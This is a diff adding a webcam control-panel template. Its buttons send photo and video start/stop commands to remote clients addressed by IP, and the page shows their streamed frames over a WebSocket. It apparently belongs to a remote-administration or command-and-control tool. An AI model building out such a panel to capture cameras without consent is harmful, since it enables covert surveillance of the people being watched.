@@ -1,0 +1,290 @@
+<div class="glass-effect rounded-xl p-6 shadow-lg" id="webcam-section-{{ ip }}">
+    <div class="flex items-center justify-between mb-4">
+        <div class="flex items-center gap-3">
+            <div
+                class="w-8 h-8 bg-gray-700/30 rounded-lg flex items-center justify-center"
+            >
+                <svg
+                    class="w-4 h-4 text-gray-300"
+                    fill="none"
+                    stroke="currentColor"
+                    viewBox="0 0 24 24"
+                >
+                    <path
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        stroke-width="2"
+                        d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"
+                    ></path>
+                </svg>
+            </div>
+            <h3 class="text-xl font-semibold text-white">Webcam (WC)</h3>
+        </div>
+        <button
+            onclick="hideWebcam('{{ ip }}')"
+            class="bg-gray-700/50 hover:bg-gray-600 text-gray-400 hover:text-white p-2 rounded-lg transition-all duration-200"
+            title="Hide webcam"
+        >
+            <svg
+                class="w-4 h-4"
+                fill="none"
+                stroke="currentColor"
+                viewBox="0 0 24 24"
+            >
+                <path
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    stroke-width="2"
+                    d="M6 18L18 6M6 6l12 12"
+                ></path>
+            </svg>
+        </button>
+    </div>
+
+    <div
+        class="bg-rgb(16,16,16) rounded-xl mb-4 p-2 flex justify-center items-center min-h-[240px] border border-gray-700/30 relative"
+    >
+        <canvas
+            id="webcam-canvas-{{ ip }}"
+            height="480"
+            class="max-w-full max-h-full rounded bg-gray-800/50"
+        ></canvas>
+        <button
+            onclick="openFullscreenWebcam('{{ ip }}')"
+            class="absolute top-3 right-3 bg-black/50 hover:bg-black/70 text-white p-2 rounded-lg transition-all duration-200"
+            title="Open fullscreen"
+        >
+            <svg
+                class="w-4 h-4"
+                fill="none"
+                stroke="currentColor"
+                viewBox="0 0 24 24"
+            >
+                <path
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    stroke-width="2"
+                    d="M4 8V4m0 0h4M4 4l5 5m11-1V4m0 0h-4m4 0l-5 5M4 16v4m0 0h4m-4 0l5-5m11 5l-5-5m5 5v-4m0 4h-4"
+                ></path>
+            </svg>
+        </button>
+    </div>
+
+    <div class="grid grid-cols-1 sm:grid-cols-3 gap-2">
+        <form hx-post="/api/command/{{ ip }}" hx-swap="none">
+            <input type="hidden" name="module" value="WC" />
+            <input type="hidden" name="args.mode" value="photo" />
+            <input type="hidden" name="args.compressing" value="true" />
+            <button
+                type="submit"
+                class="w-full bg-gray-600 hover:bg-gray-500 text-white py-2 rounded-lg transition-all duration-200 text-sm"
+            >
+                Take Photo
+            </button>
+        </form>
+
+        <form hx-post="/api/command/{{ ip }}" hx-swap="none">
+            <input type="hidden" name="module" value="WC" />
+            <input type="hidden" name="args.mode" value="video_start" />
+            <button
+                type="submit"
+                class="w-full bg-green-600/80 hover:bg-green-600 text-white py-2 rounded-lg transition-all duration-200 text-sm"
+            >
+                Start Video
+            </button>
+        </form>
+
+        <form hx-post="/api/command/{{ ip }}" hx-swap="none">
+            <input type="hidden" name="module" value="WC" />
+            <input type="hidden" name="args.mode" value="video_stop" />
+            <button
+                type="submit"
+                class="w-full bg-red-600/80 hover:bg-red-600 text-white py-2 rounded-lg transition-all duration-200 text-sm"
+            >
+                Stop Video
+            </button>
+        </form>
+    </div>
+</div>
+
+<!-- Hidden Webcam Placeholder -->
+<div
+    class="glass-effect rounded-xl p-6 shadow-lg hidden"
+    id="webcam-placeholder-{{ ip }}"
+>
+    <div class="flex items-center justify-center h-full min-h-[400px]">
+        <div class="text-center">
+            <svg
+                class="w-16 h-16 mx-auto mb-4 text-gray-600"
+                fill="none"
+                stroke="currentColor"
+                viewBox="0 0 24 24"
+            >
+                <path
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    stroke-width="1"
+                    d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"
+                ></path>
+            </svg>
+            <h3 class="text-xl font-semibold text-gray-300 mb-2">
+                Webcam Hidden
+            </h3>
+            <p class="text-gray-500 mb-4">
+                Click below to show webcam controls
+            </p>
+            <button
+                onclick="showWebcam('{{ ip }}')"
+                class="bg-white hover:bg-gray-100 text-black px-4 py-2 rounded-lg transition-all duration-200"
+            >
+                Show Webcam
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- Fullscreen Webcam Modal -->
+<div
+    id="fullscreen-webcam-{{ ip }}"
+    class="fixed inset-0 bg-black z-50 hidden flex items-center justify-center"
+>
+    <div class="relative w-full h-full flex items-center justify-center">
+        <canvas
+            id="fullscreen-canvas-{{ ip }}"
+            class="max-w-full max-h-full"
+        ></canvas>
+        <button
+            onclick="closeFullscreenWebcam('{{ ip }}')"
+            class="absolute top-4 right-4 bg-black/50 hover:bg-black/70 text-white p-3 rounded-lg transition-all duration-200"
+            title="Exit fullscreen"
+        >
+            <svg
+                class="w-6 h-6"
+                fill="none"
+                stroke="currentColor"
+                viewBox="0 0 24 24"
+            >
+                <path
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    stroke-width="2"
+                    d="M6 18L18 6M6 6l12 12"
+                ></path>
+            </svg>
+        </button>
+        <div
+            class="absolute bottom-4 left-1/2 transform -translate-x-1/2 bg-black/50 rounded-lg px-4 py-2 text-white text-sm"
+        >
+            Press ESC or click X to exit fullscreen
+        </div>
+    </div>
+</div>
+
+<script>
+    (function () {
+        const canvas = document.getElementById("webcam-canvas-{{ ip }}");
+        const fullscreenCanvas = document.getElementById(
+            "fullscreen-canvas-{{ ip }}",
+        );
+        const ctx = canvas?.getContext("2d");
+        const fullscreenCtx = fullscreenCanvas?.getContext("2d");
+        const clientId = "{{ ip }}";
+
+        if (!canvas || !fullscreenCanvas) return;
+
+        const wsProtocol =
+            window.location.protocol === "https:" ? "wss:" : "ws:";
+        const wsUrl = `${wsProtocol}//${window.location.host}/ws/feed/${clientId}`;
+
+        let ws = new WebSocket(wsUrl);
+
+        ws.onopen = () =>
+            console.log(`Connected to webcam feed for ${clientId}`);
+        ws.onerror = (err) => console.error("WebSocket Error:", err);
+        ws.onclose = () =>
+            console.log(`Disconnected from webcam feed for ${clientId}`);
+
+        ws.onmessage = async (event) => {
+            if (event.data instanceof Blob) {
+                try {
+                    const image = await createImageBitmap(event.data);
+
+                    // Update main canvas
+                    canvas.width = image.width;
+                    canvas.height = image.height;
+                    ctx.drawImage(image, 0, 0);
+
+                    // Update fullscreen canvas
+                    fullscreenCanvas.width = image.width;
+                    fullscreenCanvas.height = image.height;
+                    fullscreenCtx.drawImage(image, 0, 0);
+
+                    image.close();
+                } catch (e) {
+                    console.error("Error drawing image:", e);
+                }
+            }
+        };
+
+        setInterval(() => {
+            if (ws.readyState === WebSocket.CLOSED) {
+                console.log("Reconnecting to webcam feed...");
+                ws = new WebSocket(wsUrl);
+            }
+        }, 5000);
+
+        // ESC key handler for fullscreen
+        document.addEventListener("keydown", function (e) {
+            if (e.key === "Escape") {
+                closeFullscreenWebcam("{{ ip }}");
+            }
+        });
+    })();
+
+    // Webcam control functions
+    function openFullscreenWebcam(clientId) {
+        const modal = document.getElementById(`fullscreen-webcam-${clientId}`);
+        if (modal) {
+            modal.classList.remove("hidden");
+            document.body.style.overflow = "hidden";
+        }
+    }
+
+    function closeFullscreenWebcam(clientId) {
+        const modal = document.getElementById(`fullscreen-webcam-${clientId}`);
+        if (modal) {
+            modal.classList.add("hidden");
+            document.body.style.overflow = "";
+        }
+    }
+
+    function hideWebcam(clientId) {
+        const section = document.getElementById(`webcam-section-${clientId}`);
+        const placeholder = document.getElementById(
+            `webcam-placeholder-${clientId}`,
+        );
+        if (section && placeholder) {
+            section.classList.add("hidden");
+            placeholder.classList.remove("hidden");
+        }
+    }
+
+    function showWebcam(clientId) {
+        const section = document.getElementById(`webcam-section-${clientId}`);
+        const placeholder = document.getElementById(
+            `webcam-placeholder-${clientId}`,
+        );
+        if (section && placeholder) {
+            section.classList.remove("hidden");
+            placeholder.classList.add("hidden");
+        }
+    }
+</script>
+
+<style>
+    .glass-effect {
+        background: rgba(32, 32, 32, 0.8);
+        backdrop-filter: blur(20px);
+        border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+</style>
